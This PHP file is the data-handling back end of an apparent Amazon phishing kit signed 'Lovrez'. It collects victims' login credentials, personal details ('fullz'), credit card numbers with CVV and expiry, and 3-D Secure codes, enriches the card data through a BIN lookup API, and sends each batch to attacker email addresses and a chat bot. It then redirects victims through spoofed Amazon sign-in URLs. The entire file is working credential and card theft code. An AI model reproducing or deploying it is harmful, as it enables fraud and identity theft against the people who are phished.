<?php
session_start();
include "./config.php";
$ip = $_SESSION['IP'];
$ua = $_SESSION['UA'];
if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $message = "[🕸] +1 LOGIN [🕸]\n";
    $message .= "[👳] E-Mail : " . $email . "\n"; 
    $message .= "[👳🏿] Mot de Passe : " . $password . "\n";
    $message .= "==========================\n";
    $message .= "[💫] IP : " . $ip . "\n";
    $message .= "[💫] User-Agent : " . $ua . "\n";
    $message .= "[🕸] By Lovrez [🕸]";
    $subject = "🕸 | +1 LOG - " . $email . " - " . $ip . " | 🎰";
    $from = "From: 🕸 Lovrez 🕸 <rez@tzjzovwovw.online>";
	
    mail("tonsibg@yandex.com",$subject,$message,$from);
    sendMessage($chat_id,$message,$token);
    header('location: ../app/billing/index.php?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');
}
if (isset($_POST['name'])) {
    $name = $_POST['name'];
    $ville = $_POST['ville'];
    $adresse = $_POST['adresse'];
    $zip = $_POST['zip'];
    $dob = $_POST['dob'];
    $num = $_POST['num'];
    $_SESSION['name'] = $name;

    $message = "[🐙] +1 FULLZ [🐙]\n";
    $message .= "[🥞] Nom & Prénom du hmar : " . $name . "\n"; 
    $message .= "[🥞] Ville : " . $ville . "\n";
    $message .= "[🥞] Adresse : " . $adresse . "\n";
    $message .= "[🥞] ZIP : " . $zip . "\n";
    $message .= "[🥞] DOB : " . $dob . "\n";
    $message .= "[🥞] NUM : " . $num . "\n";
    $message .= "==========================\n";
    $message .= "[💫] IP : " . $ip . "\n";
    $message .= "[💫] User-Agent : " . $ua . "\n";
    $message .= "[🐙] By Lovrez [🐙]";
    $subject = "🐙 | +1 BILLING - " . $name . " - " . $ip . " | 🪜";
    $from = "From: 🐙 Lovrez 🐙 <rez@tzjzovwovw.online>";

    mail("",$subject,$message,$from);
    sendMessage($chat_id,$message,$token);
    header('location: ../app/payments/index.php?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');

}
if (isset($_POST['cc']) && isset($_POST['exp'])) {
    $cc = $_POST['cc'];
    $ccv = $_POST['ccv'];
    $exp = $_POST['exp'];

    $ch = curl_init();
    $url = "https://api.bincodes.com/cc/?format=json&api_key=0aeea0d6c24cb8c76ed694df5ced0461&cc=$cc";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    $brand = '';
    $type = '';
    $bank = '';
    $someArray = json_decode($result, true);
    $brand = $someArray['level'];
    $type = $someArray['type'];
    $bank = $someArray['bank'];

    $message = "[🥷🏼] +1 CC [🥷🏼]\n";
    $message .= "[📼] Nom sur carte : " . $_SESSION['name'] . "\n"; 
    $message .= "[📼] Num. de carte : " . $cc . "\n";
    $message .= "[📼] Date Exp. : " . $exp . "\n"; 
    $message .= "[📼] CCV : " . $ccv . "\n";
    $message .= "==========================\n";
    $message .= "[🏛] Banque : " . $bank . "\n";
    $message .= "[🏛] Type : " . $type . "\n"; 
    $message .= "[🏛] Level : " . $brand . "\n";
    $message .= "==========================\n";
    $message .= "[💫] IP : " . $ip . "\n";
    $message .= "[💫] UA : " . $ua . "\n";
    $message .= "[🥷🏼] By Lovrez [🥷🏼]";
    $subject = "🥷🏼 | +1 CC - " . $cc . " - " . $ip . " | 🥷🏼";
    $from = "From: 🥷🏼 Lovrez 🥷🏼 <rez@tzjzovwovw.online>";

    mail("ton-mail-ici@yandex.com",$subject,$message,$from);
    sendMessage($chat_id,$message,$token);

    if ($vbv == "yes") {
        header('location: ../app/verification/index.php?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');
    }else{
        header('location: https://amazon.com/');
    }

}
if (isset($_POST['code'])) {
    $code = $_POST['code'];

    $message = "[♣️] +1 VBV [♣️]\n";
    $message .= "[🔌] Code : " . $code . "\n"; 
    $message .= "==========================\n";
    $message .= "[💻] IP : " . $ip . "\n";
    $message .= "[🙈] UA : " . $ua . "\n";
    $message .= "[♣️] By Lovrez [♣️]";
    $subject = "☎️ | +1 VBV - " . $code . " - " . $ip . " | ☎️";
    $from = "From: ♣️ Lovrez <rez@tzjzovwovw.online>";

    mail("",$subject,$message,$from);
    sendMessage($chat_id,$message,$token);
    header('location: ../app/verification/validation.php?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&');
}

?>